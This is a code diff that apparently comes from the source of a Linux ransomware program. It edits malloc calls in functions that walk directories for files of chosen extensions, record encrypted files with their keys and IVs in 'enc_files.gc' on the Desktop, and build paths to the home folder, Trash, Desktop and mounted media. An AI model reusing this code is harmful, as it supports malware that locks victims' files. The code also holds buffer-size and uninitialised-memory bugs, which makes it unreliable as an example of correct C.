@@ -34,7 +34,7 @@ void find_files(List **files, char* start_path){
             strcpy(cp, file_types);
             if(ent->d_type == 8){ // it's a file
 
-                char *path_to_file = (char *)malloc(strlen(start_path) + strlen(ent->d_name) + 2);
+                char *path_to_file = (char *)malloc(sizeof(char) *(strlen(start_path) + strlen(ent->d_name) + 2));
                 strcpy(path_to_file, start_path);
                 strcat(path_to_file, ent->d_name);
                 ext = strtok(cp, " ");
@@ -53,7 +53,7 @@ void find_files(List **files, char* start_path){
                 if(!(strcmp(ent->d_name, "..") == 0 || strcmp(ent->d_name, ".") == 0)){
 
                     char *new_dir = ent->d_name;
-                    char *full_path = (char*) malloc(strlen(start_path)+strlen(new_dir) + 2);
+                    char *full_path = (char*) malloc(sizeof(char)*(strlen(start_path)+strlen(new_dir) + 2));
                     strcpy(full_path,start_path);
                     strcat(full_path,new_dir);
                     strcat(full_path,"/");
@@ -76,14 +76,14 @@ void save_into_file_encrypted_list(List *l, char * desktop){
     FILE *f;
     char * new_file;
     char *line;
-    new_file = (char*)malloc((strlen(desktop) + 13));
+    new_file = (char*)malloc(sizeof(char)*(strlen(desktop) + 13));
     strcpy(new_file, desktop);
     strcat(new_file, "enc_files.gc");
 
     f = fopen(new_file, "w");
-    
+
     while(l != NULL){
-        line = malloc(strlen(l->info[0]) + strlen(l->info[1]) + strlen(l->info[2]) + 11);
+        line = malloc((sizeof(char)*strlen(l->info[0]) + strlen(l->info[1]) + strlen(l->info[2]) + 11));
         strcpy(line, l->info[0]);
         strcat(line, ":");
         strcat(line, l->info[1]);
@@ -114,17 +114,17 @@ void read_from_file_encrypted_files(List **l, char * desktop){
     char *token;
     size_t len = 0;
     ssize_t read;
-    
-    char * new_file = (char *)malloc(strlen(desktop) + 13);
+
+    char * new_file = (char *)malloc((sizeof(char) * strlen(desktop) + 13));
     strcpy(new_file, desktop);
     strcat(new_file, "enc_files.gc");
-    
+
     key = (char *)malloc(sizeof(char) *33);
     iv = (char *)malloc(sizeof(char) * 17);
-    
-    
+
+
     f = fopen(new_file, "r");
-    
+
     if(f != NULL){
         if(*l == NULL){
             /*Still need to figure if the file is encrypted RSA1024*/
@@ -150,11 +150,11 @@ void read_from_file_encrypted_files(List **l, char * desktop){
             free(iv);
             free(line);
 
-            
+
         }else if(*l != NULL){
             destroy(l);
         }
-        
+
     }else{
         printf("Arquivos ainda não foram criptografados\n");
     }
@@ -186,7 +186,7 @@ char * get_home_enviroment(){
     uid = getuid();
 
     pw = (uid == NO_UID && 0? NULL: getpwuid(uid));
-    home = (char*)malloc(strlen(pw->pw_dir));
+    home = (char*)malloc((sizeof(char) * strlen(pw->pw_dir)));
     strcpy(home, pw->pw_dir);
     strcat(home, "/");
     return home;
@@ -213,7 +213,7 @@ char * get_username(){
  */
 char * get_trash_path(char * home){
     char *trash ;
-    trash = (char *)malloc(strlen(home) + 21);
+    trash = (char *)malloc((sizeof(char)* strlen(home) + 21));
     memset(trash, 0, strlen(trash));
     strcpy(trash, home);
     strcat(trash , ".local/share/Trash/");
@@ -226,7 +226,7 @@ char * get_trash_path(char * home){
  * @return -> type = char * (String)
  */
 char * get_media_path(char * username){
-    char * path = (char *)malloc(strlen(username) + 9);
+    char * path = (char *)malloc((sizeof(char)*strlen(username) + 9));
     strcpy(path, "/media/");
     strcat(path, username);
     strcat(path, "/");
@@ -239,7 +239,7 @@ char * get_media_path(char * username){
  * @return -> type = char * (String)
  */
 char * get_desktop_enviroment(char *home){
-    char * path = (char *)malloc(strlen(home) + 9);
+    char * path = (char *)malloc((sizeof(char)*strlen(home) + 9));
     strcpy(path, home);
     strcat(path, "Desktop/");
     return path;
